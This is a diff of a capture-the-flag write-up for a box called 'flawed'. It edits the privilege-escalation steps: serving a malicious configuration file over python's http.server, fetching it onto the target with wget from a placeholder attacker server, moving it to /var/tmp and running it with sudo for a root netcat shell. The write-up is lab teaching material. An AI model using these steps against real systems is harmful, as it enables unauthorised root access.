@@ -73,7 +73,7 @@ Before anything else let's start our listener<br>
 ![other nc listener](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/other-nc-listener.png "a title")
 
 Now we have to transfer our malicious configuration to the target. To make that possible we must start our local python http server in the directory containing out malicious configuration. <br>
-`python3 -m http.server 8000`
+`python3 -m http.server 8000` <br>
 ![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/start-python-http-server.png "a title")
 
 Downloading the malicious configuation from our python http server.<br>
@@ -81,5 +81,8 @@ NB: make sure you have write privileges to the current diretory you are in. You 
 `wget http://<server.ip>:<port>/test.conf`
 ![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/downloading-mal-conf-file.png "a title")
 
-Right after downloding the file we transfer it the the `/var/tmp` direcrory. This is necessary because it is the only folder that we can execute configuration files from.<br>
-![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/copy-payload-to-tmp.png "a title")
+Right after downloading the file we transfer it the the `/var/tmp` direcrory. This is necessary because it is the only folder that we can execute configuration files from.<br>
+![copy to var-tmp](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/copy-payload-to-tmp.png "a title")
+
+Now we can run our command with sudo to gain root privileges and viola!! we are root. :smiley: <br>
+![copy to var-tmp](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/spawn-nc-shell-priv.png "a title")
